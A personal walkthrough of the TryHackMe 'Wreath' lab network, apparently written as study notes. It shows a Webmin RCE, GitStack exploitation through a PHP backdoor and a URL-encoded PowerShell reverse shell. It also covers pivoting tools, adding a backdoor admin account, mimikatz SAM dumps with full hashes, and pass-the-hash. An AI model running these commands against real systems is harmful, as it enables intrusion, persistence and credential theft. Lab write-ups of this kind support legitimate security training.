# Wreath

<img src="wreath.png" alt="wreath" width=200/>

tools zip archive password: `WreathNetwork`

## Webserver

### Enumeration

#### nmap:

```
PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfKbbFLiRV9dqsrYQifAghp85qmXpYEHf2g4JJqDKUL316TcAoGj62aamfhx5isIJHtQsA0hVmzD+4pVH4r8ANkuIIRs6j9cnBrLGpjk8xz9+BE1Vvd8lmORGxCqTv+9LgrpB7tcfoEkIOSG7zeY182kOR72igUERpy0JkzxJm2gIGb7Caz1s5/ScHEOhGX8VhNT4clOhDc9dLePRQvRooicIsENqQsLckE0eJB7rTSxemWduL+twySqtwN80a7pRzS7dzR4f6fkhVBAhYflJBW3iZ46zOItZcwT2u0wReCrFzxvDxEOewH7YHFpvOvb+Exuf3W6OuSjCHF64S7iU6z92aINNf+dSROACXbmGnBhTlGaV57brOXzujsWDylivWZ7CVVj1gB6mrNfEpBNE983qZskyVk4eTNT5cUD+3I/IPOz1bOtOWiraZCevFYaQR5AxNmx8sDIgo1z4VcxOMhrczc7RC/s3KWcoIkI2cI5+KUnDtaOfUClXPBCgYE50=
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFccvYHwpGWYUsw9mTk/mEvzyrY4ghhX2D6o3n/upTLFXbhJPV6ls4C8O0wH6TyGq7ClV3XpVa7zevngNoqlwzM=
|   256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINLfVtZHSGvCy3JP5GX0Dgzcxz+Y9In0TcQc3vhvMXCP

80/tcp    open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c

443/tcp   open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Thomas Wreath | Developer
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/emailAddress=me@thomaswreath.thm/localityName=Easingwold
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/emailAddress=me@thomaswreath.thm/localityName=Easingwold
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-28T08:04:25
| Not valid after:  2022-11-28T08:04:25
| MD5:   818c 4b06 d7ae a4f9 2dce 563a 7ccc b614
| SHA-1: 501c ac34 b361 2c7d 4459 e3ec 6d5c 82f3 587e 27b9
| -----BEGIN CERTIFICATE-----
| MIIELTCCAxWgAwIBAgIUOfHf+QzlojX8GZDBu23os4WD7GcwDQYJKoZIhvcNAQEL
| BQAwgaUxCzAJBgNVBAYTAkdCMR4wHAYDVQQIDBVFYXN0IFJpZGluZyBZb3Jrc2hp
| cmUxEzARBgNVBAcMCkVhc2luZ3dvbGQxIjAgBgNVBAoMGVRob21hcyBXcmVhdGgg
| RGV2ZWxvcG1lbnQxGTAXBgNVBAMMEHRob21hc3dyZWF0aC50aG0xIjAgBgkqhkiG
| 9w0BCQEWE21lQHRob21hc3dyZWF0aC50aG0wHhcNMjExMTI4MDgwNDI1WhcNMjIx
| MTI4MDgwNDI1WjCBpTELMAkGA1UEBhMCR0IxHjAcBgNVBAgMFUVhc3QgUmlkaW5n
| IFlvcmtzaGlyZTETMBEGA1UEBwwKRWFzaW5nd29sZDEiMCAGA1UECgwZVGhvbWFz
| IFdyZWF0aCBEZXZlbG9wbWVudDEZMBcGA1UEAwwQdGhvbWFzd3JlYXRoLnRobTEi
| MCAGCSqGSIb3DQEJARYTbWVAdGhvbWFzd3JlYXRoLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBALQNxd3QADh/IbMl6/DDjBgWJGrVVUTe55vc2PWU
| CGHFDOa4a3dPA+1jSnQkMq+9O8IzJHXk9Z7iLe9ixHBLrRnzx6KZ/ofX6VDJ7drO
| pp5z76nfLobhFagmJZCNjw3E+UAzF3kpOxmFz0TvZq3GXQ2Ry6Q6EtcCALDSvKku
| 6QEVs0emwRsKU5nz1HgVj+Njg4RbXt4M+5jQFNyDp2Kt2MKX8gpG1qacXVi1Rd5H
| OFuKXuJaLls55bUfbJjBvsm8K7PFTUdrDlnBfsRa2XUVA5MPZdzCNdjGKrYHl9T/
| +MrlHekPCFQabTrPwCjnKY1pGCweSXrgBlIo3fbcDBwpj0cCAwEAAaNTMFEwHQYD
| VR0OBBYEFHnFYnI+zUXqv0lP3mz2MbCjcwbLMB8GA1UdIwQYMBaAFHnFYnI+zUXq
| v0lP3mz2MbCjcwbLMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AH3etArd/OhXpzqxiOPYNYkca3uaMZrl4HoS2feg7jaloE1VsnCtcqDJBkP+UG1T
| JdhMy9tLyEGQwjJTnPAXVipi9ckcw/7xP0ssmEDebsQS/eVJPPN28nyN6IGmaC2T
| 66BNXEqKCCI/aKxnI9KN+w0PbWCXUIJfFUShvxpTjx9Kv5LaX5JjNy78gZfz13QL
| bmp/0kVmgPR4Z6VhXEJashw2aFAeS87XDeTzRTP625GLU3uGHO5Elc3hggfeLbg+
| v4g6aRKdLWZqvmeHGCqRFtViya7wplxV6mN6phS2fxsttMAVMyAx1SG/JiK2elaL
| l426G4MiBy7WllfDQRj+DAk=
|_-----END CERTIFICATE-----
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c

10000/tcp open  http     syn-ack MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: B647BE2758DE4B037840BF45E784E257

```

We are gonna exploit `CVE-2019-15107`

```
# whoami
root
```

that was direct

```
cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18573::::::
systemd-coredump:!!:18573::::::
systemd-resolve:!!:18573::::::
tss:!!:18573::::::
polkitd:!!:18573::::::
libstoragemgmt:!!:18573::::::
cockpit-ws:!!:18573::::::
cockpit-wsinstance:!!:18573::::::
sssd:!!:18573::::::
sshd:!!:18573::::::
chrony:!!:18573::::::
rngd:!!:18573::::::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
unbound:!!:18573::::::
apache:!!:18573::::::
nginx:!!:18573::::::
mysql:!!:18573::::::
```

download `/root/.ssh/id_rsa` for persitent access

## Pivoting

two main ways:

```
    Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall

    Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host
```

you can `portfwd` on metasploit

### Enumeration

Arp cache (windows/linux)

```
[root@prod-serv ~]# arp -a
ip-10-200-185-1.eu-west-1.compute.internal (10.200.185.1) at 02:81:d2:e0:8a:a3 [ether] on eth0
ip-10-200-185-100.eu-west-1.compute.internal (10.200.185.100) at 02:04:24:e5:83:e7 [ether] on eth0
ip-10-200-185-150.eu-west-1.compute.internal (10.200.185.150) at 02:87:f1:52:79:87 [ether] on eth0
ip-10-200-185-250.eu-west-1.compute.internal (10.200.185.250) at 02:20:65:d7:b4:c7 [ether] on eth0
```

local hosts (`C:\Windows\System32\drivers\etc\hosts` on windows)

```
[root@prod-serv ~]# cat /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
```

local dns servers (`ipconfig /all` on windows or `nmcli dev show` on linux too)

```
[root@prod-serv ~]# cat /etc/resolv.conf
# Generated by NetworkManager
search eu-west-1.compute.internal
nameserver 10.200.0.2
```

Bash port scan (very slow)

```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

ping sweep exemple

```
for i in {1..255}; do (ping -c 1 172.16.1.${i} | grep "bytes from" &); done
```

### Proxychains & foxyproxy

`proxychains` command forward appended commands through a port configured in `/etc/proxychains.conf`

Or `~/.proxychains/proxychains.conf` Or also `/etc/proxychains.conf`

```
...
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
socks4  127.0.0.1 4242
```

exemple : `proxychains telnet 172.16.0.100:23`

For web apps prefer FoxyProxy

### Ssh tunneling/port forwardng

Exemple of reverse port forward ssh

```
ssh -R 2222:172.16.0.10:22 kali@172.16.0.200 -i id_rsa -fN
```

Exemple or reverse proxy ssh

```
ssh -R 8000 user@target.thm -fN
```

Another ssh port forward exemple

```
ssh -R 8000:127.0.0.1:80 user@172.16.0.50:80  -fN
```

### plink.exe

Exemple of plink reverse connection

```
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

Use `puttygen` for keys generation

### socat

Exemple of socat reverse shell

```
./socat tcp -l:8000 tcp:172.16.0.200:443
```

Exemple of easy socat port forward with process background

```
./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
```

### Chisel

Chisel server exemple for reverse connection

```
./chisel server -p 4242 --reverse &
```

corresponding listenner client on compromised machine

```
./chisel client 172.16.0.200:4242 R:socks &
```

Exemple of chisel remote port forward

```
./chisel client 172.16.0.100:3306 R:33060:172.16.0.200:1337 &

```

Exemple of chisel local port forward

```
./chisel client 172.16.0.5:8000 4444:172.16.0.10:80

```

### Sshuttle

Basic sshuttle conection example

```
sshuttle -r pwned@172.16.20.7 172.16.0.0/16
```

to use keyfiles

```
--ssh-cmd "ssh -i priv_key"
```

`-X` flag for broken pipe error

## Git Server

### Enumeration

```
[root@prod-serv ~]# curl 10.50.182.6/nmap-nairolf -o /tmp/nmap-nairolf && chmod +x /tmp/nmap-nairolf

[root@prod-serv tmp]# ./nmap-nairolf -sn 10.200.185.1-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-11-28 20:00 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-185-1.eu-west-1.compute.internal (10.200.185.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00023s latency).
MAC Address: 02:81:D2:E0:8A:A3 (Unknown)
Nmap scan report for ip-10-200-185-100.eu-west-1.compute.internal (10.200.185.100)
Host is up (0.00030s latency).
MAC Address: 02:04:24:E5:83:E7 (Unknown)
Nmap scan report for ip-10-200-185-150.eu-west-1.compute.internal (10.200.185.150)
Host is up (-0.10s latency).
MAC Address: 02:87:F1:52:79:87 (Unknown)
Nmap scan report for ip-10-200-185-250.eu-west-1.compute.internal (10.200.185.250)
Host is up (0.00020s latency).
MAC Address: 02:20:65:D7:B4:C7 (Unknown)
Nmap scan report for ip-10-200-185-200.eu-west-1.compute.internal (10.200.185.200)
Host is up.


Nmap scan report for ip-10-200-185-100.eu-west-1.compute.internal (10.200.185.100)
Host is up, received arp-response (0.00027s latency).
All 6150 scanned ports on ip-10-200-185-100.eu-west-1.compute.internal (10.200.185.100) are filtered because of 6150 no-responses
MAC Address: 02:04:24:E5:83:E7 (Unknown)

Nmap scan report for ip-10-200-185-150.eu-west-1.compute.internal (10.200.185.150)
Host is up, received arp-response (0.00053s latency).
Scanned at 2021-11-28 20:15:27 GMT for 108s
Not shown: 6147 filtered ports
Reason: 6147 no-responses
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
MAC Address: 02:87:F1:52:79:87 (Unknown)

```

### pivoting

we choose the sshuttle way

```
sshuttle -r root@10.200.185.200 --ssh-cmd "ssh -i id_rsa" -N
[local sudo] Password:
c : Connected to server.

```

`gitstack` is running

we find `43777.py` on exploitdb for RCE

### Code Review

fix DOS line endings

```
└──╼ $dos2unix ./43777.py
dos2unix: conversion du fichier ./43777.py au format Unix…
```

Or manually

```
sed -i 's/\r//' ./43777.py
```

### Exploitation

```
└──╼ $python2 43777.py
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work.
[+] Execute command
"nt authority\system
"


└──╼ $curl -X POST http://10.200.185.150/web/exploit-nairolf.php -d "a=whoami"
"nt authority\system
"

```

```
└──╼ $curl -X POST http://10.200.185.150/web/exploit-nairolf.php -d "a=hostname"
"git-serv
"

└──╼ $curl -X POST http://10.200.185.150/web/exploit-nairolf.php -d "a=systeminfo"
"
Host Name:                 GIT-SERV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-70000-00000-AA159
Original Install Date:     08/11/2020, 13:19:49
System Boot Time:          28/11/2021, 08:01:53
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 24/08/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 569 MB
Virtual Memory: Max Size:  2,538 MB
Virtual Memory: Available: 747 MB
Virtual Memory: In Use:    1,791 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4580422
                           [02]: KB4512577
                           [03]: KB4580325
                           [04]: KB4587735
                           [05]: KB4592440
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.185.1
                                 IP address(es)
                                 [01]: 10.200.185.150
                                 [02]: fe80::15f4:6794:f493:16ad
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
"

```

```
└──╼ $ip -a link
...

└──╼ $sudo tcpdump -i eth0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
```

```
└──╼ $curl -X POST http://10.200.185.150/web/exploit-nairolf.php -d "a=ping -n 3 10.50.182.6"
"
Pinging 10.50.182.6 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.182.6:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
"
```

let's open a port in the centOs firewall (I chose 23123 )

```
└──╼ $ssh root@10.200.185.200 -i id_rsa
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 23123/tcp
success
```

Then we upload a netcat on machine 1

```
[root@prod-serv ~]# curl 10.50.182.6:4444/nc-nairolf -o /tmp/nc-nairolf && chmod +x /tmp/nc-nairolf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2846k  100 2846k    0     0  57069      0  0:00:51  0:00:51 --:--:-- 63083
[root@prod-serv ~]#
```

it listens!

```
[root@prod-serv tmp]# ./nc-nairolf -lnvp 23123
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::23123
Ncat: Listening on 0.0.0.0:23123
```

We will use this `powershell exploit` as its windows

```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.185.200',23123);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

then we url encode it and pass it as curl command

```
└──╼ $curl -X POST http://10.200.185.150/web/exploit-nairolf.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.185.200%27%2C23123%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"

```

Back on machine 1 we get a shell to machine 2

```
...
Ncat: Connection from 10.200.185.150.
Ncat: Connection from 10.200.185.150:56016.
id
PS C:\GitStack\gitphp>

```

### Stabilisation and Post-exploitation

We add a new admin user (as we are already system we can)

```
PS C:\GitStack\gitphp> net user nairolf nairolfpass /add
The command completed successfully.
```

then we add it to groups

```
PS C:\GitStack\gitphp> net localgroup Administrators nairolf /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" nairolf /add
The command completed successfully.
```

We check that

```
PS C:\GitStack\gitphp> net user nairolf
User name                    nairolf
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            29/11/2021 00:24:58
Password expires             Never
Password changeable          29/11/2021 00:24:58
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.
```

Damn right!

Now as both are enabled we can either RDP or use evil-winrm

I prefer evil-winrm

```
└──╼ $evil-winrm -u nairolf -p nairolfpass -i 10.200.185.150

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nairolf\Documents>
```

Ugh..we still need to RDP too

```
└──╼ $xfreerdp /v:10.200.185.150 /u:nairolf /p:nairolfpass +clipboard /dynamic-resolution /drive:/home/nair0lf32/Desktop/Stuff/THM/Wreath/www,share
```

And mimikatz from our share

```

C:\Windows\system32>\\tsclient\share\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/


mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

668     {0;000003e7} 1 D 20104          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00a0f9c3} 4 F 11427937    GIT-SERV\nairolf        S-1-5-21-3335744492-1614955177-2693036043-1007
(15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 11516224    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

```

NOW the MASSIVE dump!

```
mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c


RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b


RID  : 000003ea (1002)
User : sassy808s
  Hash NTLM: ff070ee5b7934cf1affde37187b89b01

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b9b5c482e4c8d63469b38e0bed826904

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVsassy808s
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e9c5249ff3197cc51f5c1846418bfc03c79e4effd1d38e66eda57a38a4daa313
      aes128_hmac       (4096) : d6a08e2ce0713ad69de8d87b32f732a2
      des_cbc_md5       (4096) : 85b5aee55b1cf47c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVsassy808s
    Credentials
      des_cbc_md5       : 85b5aee55b1cf47c


RID  : 000003eb (1003)
User : franken
  Hash NTLM: 59410f64c8c3039d6eb3716343b76da1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 5b2f13565a64af1e131b1e587e199904

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVfranken
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 37f7ab7adef307ecf6d2744c1227eb6cd48260aba1bb6ad76649afee405f3dca
      aes128_hmac       (4096) : 16d6419c6acdd1dbf74fa448f1fdd18a
      des_cbc_md5       (4096) : 757ff73b62a2135e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVfranken
    Credentials
      des_cbc_md5       : 757ff73b62a2135e


RID  : 000003ec (1004)
User : admin
  Hash NTLM: 46bf34d2bc7de0c782a2a2dd30331380

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4555c3dc1fd6b46a0b711840cd3a53

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVadmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : cdd74d52c06d58de61abed0a7c19d752291f9d1fb414acc4182073e01b77bd53
      aes128_hmac       (4096) : ba51b10e22bad1f70210d43b3c41ea83
      des_cbc_md5       (4096) : 860e7598688351f7

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVadmin
    Credentials
      des_cbc_md5       : 860e7598688351f7


RID  : 000003ed (1005)
User : 95cn
  Hash NTLM: 579da618cfbfa85247acf1f800a280a4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 75c7de13da42a8549416ad47edb8e3c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERV95cn
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : db43687c2cb2dd675b069853e144942095cfcba10329037cfe8d02b1b5325f14
      aes128_hmac       (4096) : cb6f4d9623586f986d4afd8694784efb
      des_cbc_md5       (4096) : 61678319fd7a1591

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERV95cn
    Credentials
      des_cbc_md5       : 61678319fd7a1591


RID  : 000003ee (1006)
User : Dark
  Hash NTLM: 870882cb4964ed49985e20088343976c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d1208b188cdb4185725f28cf471712bc

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVDark
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 2a427766985f4dcaa28da841ae043b1c5d34b37be94b73cdb847c2115415a2c6
      aes128_hmac       (4096) : a7a9a37666ba4aa2808bdaa3d2ccdee0
      des_cbc_md5       (4096) : 29c2eaf108329bce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVDark
    Credentials
      des_cbc_md5       : 29c2eaf108329bce


RID  : 000003ef (1007)
User : nairolf
  Hash NTLM: b60afe119df8a6c8b28a64facc1671de

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 5e564bbb5d00341a43661f0dd1002f9d

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVnairolf
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f810d2b0d6c74b3185d2025e9350d6ba365d9a85cf973c17250003f2f19f6996
      aes128_hmac       (4096) : 20612d939ee5d3a4f18fc853c9a69140
      des_cbc_md5       (4096) : 2954152c3157101f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVnairolf
    Credentials
      des_cbc_md5       : 2954152c3157101f

```

`Thomas : i<3ruby`

For stro persistence with evil-winrm we can use `Pass-the-hash` technique

```
evil-winrm -u Administrator -H ADMIN_HASH -i IP
```

## Command and control

```
└──╼ $sudo powershell-empire server
[sudo] Mot de passe de nair0lf32 :
[*] Loading default config
[*] Setting up database.
[*] Adding default user.
[*] Adding database config.
[*] Generating random staging key
[*] Adding default bypasses.
[*] Adding default keyword obfuscation functions.
[*] Loading stagers from: /usr/share/powershell-empire/empire/server/stagers/
[*] Loading modules from: /usr/share/powershell-empire/empire/server/modules/
